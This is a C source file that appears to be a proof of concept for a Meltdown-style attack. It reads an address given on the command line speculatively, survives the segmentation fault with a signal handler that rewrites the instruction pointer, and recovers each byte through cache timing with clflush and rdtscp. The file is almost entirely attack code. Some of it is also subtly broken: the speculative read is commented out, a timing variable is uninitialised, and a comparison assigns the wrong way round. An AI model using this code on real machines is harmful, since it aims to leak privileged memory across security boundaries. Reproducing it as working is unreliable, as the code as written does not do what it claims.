#define _GNU_SOURCE
#include <stdio.h>
#include <signal.h>
#include <string.h>
#include <ucontext.h>
#include <unistd.h>
#include <fcntl.h>
#include <x86intrin.h>
#include <sys/types.h>
#include <sys/wait.h>
#define PAGE_SIZE 4 * 1024
#define ARRAY_SIZE 256

static char target_array[ARRAY_SIZE * PAGE_SIZE];
int check_array[ARRAY_SIZE];

int get_access_time(volatile unsigned long addr)
{
	int time1,time2,a=1;
	time1=__rdtscp(&a);
	(void*)addr;
	time2=__rdtscp(&a);
	return time2-time1;
}

void clflush(void)
{
	int i;
/*	time1 = __rdtscp(&zero);
		(void*)addr;
		time2 = __rdtscp(&zero);
		printf("timebefore:%d--%d\n",time2-time1,i);*/
	for (i = 0; i < ARRAY_SIZE; i++)
		_mm_clflush(&target_array[i * PAGE_SIZE]);
/*		time1 = __rdtscp(&zero);
		(void*)addr;
		time2 = __rdtscp(&zero);
		printf("timeafter:%d--%d\n",time2-time1,i);
		time1 = __rdtscp(&zero);
		(void*)addr;
		time2 = __rdtscp(&zero);
		printf("timeafter:%d--%d\n",time2-time1,i);*/
}

extern char stopspeculate[];

void speculate(unsigned long addr)
{
//	pid_t pid=0;
//	pid=fork();
//	if(pid==0)
//		printf("child!\n");
	asm volatile (
		"1:\n\t"

		".rept 300\n\t"
		"add $0x141, %%rax\n\t"
		".endr\n\t"

		"movzx (%[addr]), %%eax\n\t"
		"shl $12, %%rax\n\t"
		"jz 1b\n\t"
		"movzx (%[target], %%rax, 1), %%rbx\n"

		"stopspeculate: \n\t"
		"nop\n\t"
		:
		: [target] "r" (target_array),
		  [addr] "r" (addr)
		: "rax", "rbx"
	);
}
void check(void)
{
	int i, t,min_time,min_i;
	volatile char *addr;
	for (i = 0; i < ARRAY_SIZE; i++) 
	{
		addr = &target_array[i * PAGE_SIZE];
		t = get_access_time(addr);
		printf("time:%d--%d\n",t,i);
		if(t<min_time)
		{
			t=min_time;
			min_i=i;
		}
	}
	check_array[min_i]++;
}

int readbyte(unsigned long addr)
{
	static char cache_time[256];
	int max_i, max=0,time1,time2;
	memset(check_array, 0, sizeof(check_array));
	int i,j;
	unsigned long addr1=target_array;
	for (i = 0; i < 1; i++)
	{
//		printf("111 %d\n",get_access_time(target_array));
		clflush();
//		printf("222 %d\n",get_access_time(target_array));
//		printf("333 %d\n",get_access_time(target_array));
//		speculate(addr);
		check();
	}
	for(i=0;i<ARRAY_SIZE;i++)
	{
		if(max<check_array[i])
		{
			max_i=i;
			max=check_array[i];
		}
	}
	return max_i;
}

void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
	ucontext_t *ucontext = context;
	ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;
	return;
}

int set_signal(void)
{
	struct sigaction act = {
		.sa_sigaction = sigsegv,
		.sa_flags = SA_SIGINFO,
	};

	return sigaction(SIGSEGV, &act, NULL);
}

int main(int argc, char *argv[])
{
	int i, ret;
	int fd;
	unsigned long addr;
	int size=10;
	sscanf(argv[1], "%lx", &addr);
	sscanf(argv[2], "%dx", &size);
	ret=set_signal();
	memset(target_array, 1, sizeof(target_array));
	for (i = 0; i < size; i++)
	{
		ret = readbyte(addr);
		printf("read:%lx ret=%d\n", addr, ret);
		addr++;
	}
	return 0;
}